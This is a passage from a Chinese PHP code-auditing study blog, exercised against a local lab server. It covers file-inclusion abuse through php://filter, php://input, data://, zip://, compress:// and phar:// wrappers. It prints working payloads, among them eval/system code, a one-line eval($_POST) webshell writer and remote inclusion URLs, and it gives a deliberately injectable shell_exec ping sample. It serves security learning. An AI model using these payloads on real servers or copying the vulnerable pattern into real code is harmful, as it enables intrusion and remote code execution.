-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>convert.base64-encode &amp; convert.base64-decode</td>
-<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
-</tr>
-<tr>
-<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
-<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
-</tr>
-</tbody></table>
-<p>其中最常用的便是convert.base64-encode 或 convert.base64-decode ，用于加解密完整读取文件</p>
-<table>
-<thead>
-<tr>
-<th>压缩过滤器</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>zlib.deflate &amp; zlib.inflate</td>
-<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
-</tr>
-<tr>
-<td>bzip2.compress &amp; bzip2.decompress</td>
-<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>加密过滤器</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>mcrypt.*</td>
-<td>libmcrypt 对称加密算法</td>
-</tr>
-<tr>
-<td>mdecrypt.*</td>
-<td>libmcrypt 对称解密算法</td>
-</tr>
-</tbody></table>
-<ul>
-<li>示例：</li>
-</ul>
-<ol>
-<li> <code>php://fileter/read=convert.base64-encode/resource=[文件名] </code>以base64加密的方式读取文件</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.txt</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024202338746.png" alt="image-20211024202338746"></p>
-<p>​        2.<code>php://input</code> 执行php代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>执行任意代码:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /phplearn/<span class="keyword">global</span>.php?file=php:<span class="comment">//input HTTP/1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">93.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">93.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 36</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1/phplearn/global.php</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php eval(&#x27;system(&quot;ipconfig&quot;);&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024204509292.png" alt="image-20211024204509292"> </p>
-<p>写webshell：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;webshell.php&quot;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024205148007.png" alt="image-20211024205148007"></p>
-<h4 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h4><ul>
-<li>条件:</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on;</span><br><span class="line">allow_url_include: off/on;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>作用:<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属压缩流，可以访问压缩文件中的子文件，更重要的是，他并不需要指定后缀名，可修改为任意后缀：<code>jpg png gix</code>等等。</li>
-<li>示例</li>
-</ul>
-<h5 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h5><p><code>zip://[压缩文件的绝对路径]%23[压缩文件内的子文件名]</code></p>
-<p>压缩文件可以不为<strong>zip</strong>结尾</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phplearn/global.php?file=zip://D:\phpstudy_pro\WWW\phplearn\hello.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024211907449.png" alt="image-20211024211907449"></p>
-<h5 id="compress-zlib-file-gz"><a href="#compress-zlib-file-gz" class="headerlink" title="compress.zlib://file.gz"></a>compress.zlib://file.gz</h5><p>压缩phpinfo.txt为phpinfo.gz并上传(同样支持任意后缀名)</p>
-<p>compress.zlib://D:\phpstudy_pro\WWW\phplearn\hello.txt.gz</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=compress.zlib://D:\phpstudy_pro\WWW\phplearn\hello.txt.gz</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025104109551.png" alt="image-20211025104109551"></p>
-<h5 id="compress-bzip2-file-bzq2"><a href="#compress-bzip2-file-bzq2" class="headerlink" title="compress.bzip2://file.bzq2"></a>compress.bzip2://file.bzq2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=compress.bzip2://D:\phpstudy_pro\WWW\phplearn\hello.txt.bz2</span></span><br></pre></td></tr></table></figure>
-
-<p>此处我的电脑未能正常解析php文件。</p>
-<h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><ul>
-<li>条件</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on;</span><br><span class="line">allow_url_include:one;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>作用: 自<code>php&gt;=5.2.0</code>起，可以使用<code>data://</code> 数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码</li>
-<li>语法:</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> php代码 <span class="meta">?&gt;</span></span></span><br><span class="line">data:<span class="comment">//text/plain;base64,<span class="meta">&lt;?php</span> php代码 <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>示例</li>
-</ul>
-<h5 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain"></a>data://text/plain</h5><p>若是GET传参，在bp中应注意空格转换为%20避免解析错误</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p><strong><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105240142.png" alt="image-20211025105240142"></strong></p>
-<h5 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data://text/plain;base64,"></a>data://text/plain;base64,</h5><p>将php代码转为base64形式，特殊字符转为url格式</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105549575.png" alt="image-20211025105549575"></p>
-<h4 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp;https:// 协议"></a>http:// &amp;https:// 协议</h4><ul>
-<li>条件</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line">allow_url_fopen:on</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>作用: 常规url格式，允许<code>http 1.0</code>的GET方法，以只读访问文件或资源换。CTF常用于远程文件包含</li>
-<li>用法</li>
-</ul>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>示例</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.31.22.30/phplearn/global.php?file=http://127.0.0.1/phplearn/phpinfo.txt</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105851296.png" alt="image-20211025105851296"></p>
-<h4 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a>phar:// 协议</h4><p>phar:// 协议与zip协议类似，同样可以访问zip格式的压缩包内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:<span class="comment">//D:\phpstudy_pro\WWW\phplearn\phpinfo.zip\phpinfo.txt</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025110236065.png" alt="image-20211025110236065"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-PHP代码审计学习-1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/10/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-1/" class="article-date">
-      <time datetime="2021-10-24T02:26:22.000Z" itemprop="datePublished">2021-10-24</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/10/24/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-1/">PHP代码审计学习-1</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h4 id="审计时可能会涉及到的超全局变量"><a href="#审计时可能会涉及到的超全局变量" class="headerlink" title="审计时可能会涉及到的超全局变量"></a>审计时可能会涉及到的超全局变量</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span>;</span><br><span class="line"><span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$_REQUEST</span>;</span><br><span class="line"><span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$_ENV</span>;</span><br><span class="line"><span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$_SESSION</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<h4 id="各个变量作用说明"><a href="#各个变量作用说明" class="headerlink" title="各个变量作用说明"></a>各个变量作用说明</h4><p>(1) $GLOBALS 引用全局作用域中可用的全部变量</p>
-<p>在一个php脚本的全部作用域全都可以访问到，$GLOBALS是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
-<p>(2) $_SERVER</p>
-<p>是一个包含了诸如头信息（header）、路径(path)、以及脚本位置(script locations) 等等信息的数组。这个数组中的项目由web服务器创建。不能保证每个服务器都会提供给我们完整的信息；服务器可能会忽略一些，也可能会提供一些没有列举在此处的信息给我们。</p>
-<p>以下列出了所有$_SERVER变量中的重要元素：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>] <span class="comment">#当前正在执行 脚本的文件名，与 document root相关。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>] <span class="comment">#传递给该 脚本的参数。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argc&#x27;</span>] <span class="comment">#包含传递给程序的 命令行参数的个数（如果运行在命令行模式）。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>] <span class="comment">#服务器使用的 CGI 规范的版本。例如，“CGI/1.1”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] <span class="comment">#当前 运行脚本所在服务器 主机的名称。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>] <span class="comment">#服务器标识的字串，在响应请求时的头部中给出。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>] <span class="comment">#请求页面时通信协议的名称和版本。例如，“HTTP/1.0”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] <span class="comment">#访问页面时的请求方法。例如：“GET”、“HEAD”，“POST”，“PUT”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>] <span class="comment">#查询(query)的字符串。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>] <span class="comment">#当前 运行脚本所在的文档根目录。在服务器配置文件中定义。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>] <span class="comment">#当前请求的 Accept: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_CHARSET&#x27;</span>] <span class="comment">#当前请求的 Accept-Charset: 头部的内容。例如：“iso-8859-1,*,utf-8”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_ENCODING&#x27;</span>] <span class="comment">#当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]<span class="comment">#当前请求的 Accept-Language: 头部的内容。例如：“en”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CONNECTION&#x27;</span>] <span class="comment">#当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] <span class="comment">#当前请求的 Host: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27; HTTP_REFERER&#x27;</span>] <span class="comment">#链接到当前页面的前一页面的 URL 地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27; HTTP_USER_AGENT&#x27;</span>] <span class="comment">#当前请求的 User-Agent: 头部的内容。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] — 如果通过https访问,则被设为一个非空的值(on)，否则返回off</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="comment">#正在浏览当前页面用户的 IP 地址。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_HOST&#x27;</span>] <span class="comment">#正在浏览当前页面用户的 主机名。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_PORT&#x27;</span>] <span class="comment">#用户连接到服务器时所使用的端口。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>] <span class="comment">#当前执行 脚本的 绝对路径名。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADMIN&#x27;</span>] <span class="comment"># 管理员信息</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>] <span class="comment">#服务器所使用的端口</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SIGNATURE&#x27;</span>] <span class="comment">#包含服务器版本和 虚拟主机名的字符串。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_TRANSLATED&#x27;</span>] <span class="comment">#当前 脚本所在文件系统（不是文档根目录）的基本路径。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>] <span class="comment">#包含当前 脚本的路径。这在页面需要指向自己时非常有用。</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>] <span class="comment">#访问此页面所需的 URI。例如，“/index.html”</span></span><br></pre></td></tr></table></figure>
-
-<p>(3) $_REQUEST</p>
-<p>用于收集HTML当中提交的数据，无论$_GET、$_POST或其他方式均可接受到，我们可以用$_REQUEST来收集表单中所提交的信息。</p>
-<p>(4) $_POST</p>
-<p>应用于提交表单，或复杂信息。</p>
-<p>(5) $_GET</p>
-<p>可用于提交表单，或提交简单信息于服务器，可在<form method="GET">处设置</form></p>
-<p>(6) $_FILES</p>
-<p>获取文件 </p>
-<p>演示代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;heade&gt;</span><br><span class="line"></span><br><span class="line">&lt;/heade&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;global.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;fileupload&quot;</span>/&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;send file&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $GLOBALS 引用全局作用域中可用的全部变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;foo&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in local scope: &#x27;</span>.<span class="variable">$foo</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;globals variable&quot;</span>;</span><br><span class="line"><span class="comment">#此处可以见得，由$AGLOBALS调用的foo变量是全局变量</span></span><br><span class="line"><span class="comment">#在foo函数内直接调用的$foo变量是局部变量</span></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用var_dump递归的打印$_SERVER中存储的服务器信息</span></span><br><span class="line"><span class="comment">#var_dump($_SERVER);</span></span><br><span class="line"><span class="comment">#打印输出当前php文件在服务器上的根目录</span></span><br><span class="line"></span><br><span class="line">print_r(<span class="string">&#x27;PATH_TRANSLATED:&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_TRANSLATED&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_GET[a]:&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_POST[b]:&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_REQUEST[c]:&#x27;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$_FILES 是一个预定义数组，用来获取通过POST方式上传文件的相关信息。如果为单个文件单独上传，那么$_FILES 为二维数组；如果为多个文件上传，那么￥FILES为三维数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#拿到上传文件进行打印</span></span><br><span class="line">print_r(<span class="variable">$_FILES</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024111608484.png" alt="image-20211024111608484"></p>
-<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(1).assets/image-20211024111557690.png" alt="image-20211024111557690"></p>
-<h4 id="简单命令执行漏洞分析"><a href="#简单命令执行漏洞分析" class="headerlink" title="简单命令执行漏洞分析"></a>简单命令执行漏洞分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$cmd</span> = shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$target</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
